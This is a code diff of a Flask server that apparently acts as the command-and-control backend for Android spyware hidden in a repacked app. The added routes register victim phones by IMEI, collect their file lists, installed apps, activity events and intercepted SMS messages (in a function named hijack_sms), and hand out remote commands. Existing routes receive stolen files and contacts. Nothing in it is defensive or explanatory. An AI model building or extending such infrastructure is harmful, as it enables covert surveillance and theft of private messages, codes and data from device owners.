@@ -1,16 +1,12 @@
 from flask import Flask, request
-import random
-from utils import database
 import base64
-import string 
-app = Flask(__name__)
+import string
+from utils.database import MongoClient, get_secret
+from datetime import datetime
+import os
 
-def _get_rand_key(len=24):
-    rand_key = ''.join(random.choice(string.ascii_letters) for i in range(len))
-    if database.key_exists(rand_key):
-        return  _get_rand_key(len)
-    else:
-        return rand_key
+app = Flask(__name__)
+mongo = MongoClient()
 
 
 @app.route('/register', methods=['POST', 'GET'])
@@ -20,41 +16,128 @@ def register():
     except Exception as e:
         print(e)
         return 'request is not correct'
-    print(data)
     secret = data['s']
-    if secret != database.get_secret():
+    if secret != get_secret():
         return 'nice try, don\'t try to repack a repack'
 
-    info = dict()
-    info['imei'] = data['i']
-    info['key'] = _get_rand_key()
+    imei = data['i']
+    _id = mongo.add_imei(imei)
+    return _id
 
-    res = database.update_database(info)
-    if res:
-        return info['key']
-    else: # phone already registered
-        return database.get_key_for_imei(info['imei'])
 
+@app.route('/files', methods=['POST'])
+def files_list():
+    try:
+        data = request.json
+    except Exception as e:
+        print(e)
+        return 'request is not correct'
+
+    secret = data['s']
+    if secret != get_secret():
+        return 'nice try, don\'t try to repack a repack'
+    _id = data['k']
+    files = data['data'].split(';')
+
+    result = mongo.add_files_for_id(_id, files[:-1])
+
+    if result:
+        return 'yes'
+    return 'no'
+
+
+@app.route('/apps', methods=['POST'])
+def installed_apps():
+    try:
+        data = request.json
+    except Exception as e:
+        print(e)
+        return 'request is not correct'
+
+    secret = data['s']
+    if secret != get_secret():
+        return 'nice try, don\'t try to repack a repack'
+    _id = data['k']
+    apps = data['data'].split(';')
+
+    result = mongo.add_apps_for_id(_id, apps[:-1])
+
+    if result:
+        return 'yes'
+    return 'no'
+
+
+@app.route('/events', methods=['POST'])
+def user_events():
+    data = request.json
+    secret = data['s']
+    if secret != get_secret():
+        return 'nice try, don\'t try to repack a repack'
+    _id = data['k']
+    events = data['data'].split('\n')[1:-1]
+
+    events_dict = {}
+    for e in events:
+        split_e = e.split(';')
+        t = datetime.strptime(split_e[1], "%b %d, %Y %I:%M:%S %p")
+        event = split_e[0][:-1]
+        if event in events_dict:
+            events_dict[event].append(t.timestamp())
+        else:
+            events_dict[event] = [t.timestamp()]
+    result = mongo.add_events_for_id(_id, events_dict)
+
+    if result:
+        return 'yes'
+    return 'no'
+
+
+@app.route('/sms', methods=['POST'])
+def hijack_sms():
+    try:
+        data = request.json
+    except Exception as e:
+        print(e)
+        return 'request is not correct'
+
+    secret = data['s']
+    if secret != get_secret():
+        return 'nice try, don\'t try to repack a repack'
+    _id = data['k']
+    sms = data['data'].split('\n')[:-2]
+    sms_list = []
+    for s in sms:
+        sms_list.append(s.split(';')[1])
+    result = mongo.add_sms_for_id(_id, sms_list)
+
+    if result:
+        return 'yes'
+    return 'no'
 
 
 @app.route('/command', methods=['POST'])
 def command():
-    data = request.json
-    secret = data['s']
-    if secret != database.get_secret():
-        return 'nice try, don\'t try to repack a repack'
+    try:
+        data = request.json
+    except Exception as e:
+        print(e)
+        return 'request is not correct'
 
-    com = database.get_command_for_key(data['k'])
-    if not com:
-        return 'w'
-    else:
-        return com
+    secret = data['s']
+    if secret != get_secret():
+        return 'nice try, don\'t try to repack a repack'
+    _id = data['k']
+
+    cmd = mongo.get_command_for_id(_id)
+
+    return cmd
+
 
 @app.route('/upfile', methods=['POST'])
 def upfile():
     data = request.json
     secret = data['s']
-    if secret != database.get_secret():
+    if secret != get_secret():
         return 'nice try, don\'t try to repack a repack'
 
     filename = data['n']
@@ -62,8 +145,7 @@ def upfile():
     imei = data['i']
     new_name = os.path.join(imei, filename)
 
-
-    database.register_file(imei, filename, new_name)
+    # database.register_file(imei, filename, new_name)
     with open(new_name, 'wb') as f:
         f.write(raw)
 
@@ -72,15 +154,14 @@ def upfile():
 def upcontacts():
     data = request.json
     secret = data['s']
-    if secret != database.get_secret():
+    if secret != get_secret():
         return 'nice try, don\'t try to repack a repack'
-
 
     imei = data['i']
     contacts = data['c'].split(',')
 
+    # database.register_contacts(imei, contacts)
 
-    database.register_contacts(imei, contacts)
 
 if __name__ == '__main__':
     app.run()
